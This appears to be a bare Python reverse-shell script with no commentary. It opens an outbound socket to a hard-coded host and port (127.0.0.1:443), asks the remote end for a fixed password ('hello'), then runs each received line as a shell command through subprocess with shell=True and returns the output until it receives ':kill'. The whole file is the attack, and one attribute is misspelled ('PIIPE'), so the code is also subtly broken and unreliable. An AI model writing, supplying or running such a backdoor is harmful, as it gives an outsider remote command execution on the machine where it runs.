import subprocess
import socket

host = '127.0.0.1'
port = 443
passwd = 'hello'

def Login():
    global s
    s.send("Login: ")
    pwd = s.recv(1024)

    if pwd.strip() != passwd:
        Login()
    else:
        s.send("Connected #> ")
        Shell()


def Shell():
    while(True):
        data = s.recv(1024)

        if data.strip() == ":kill":
            break

        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)
        s.send("#> ")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
Login()
